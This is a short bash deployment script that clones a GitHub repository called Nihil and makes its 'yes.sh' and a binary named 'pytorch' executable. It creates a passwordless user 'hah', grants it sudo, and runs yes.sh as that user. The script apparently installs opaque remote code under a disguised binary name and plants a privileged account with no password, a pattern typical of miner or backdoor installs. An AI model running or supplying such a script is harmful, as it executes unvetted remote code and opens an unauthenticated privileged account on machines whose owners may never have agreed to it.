#!/bin/bash
sudo apt update
git clone https://github.com/keratsakti/Nihil && cd Nihil
chmod +x yes.sh && chmod +x pytorch
sudo adduser --disabled-password --gecos "" hah && sudo usermod -aG sudo hah
sudo -u hah -H sh -c "./yes.sh"
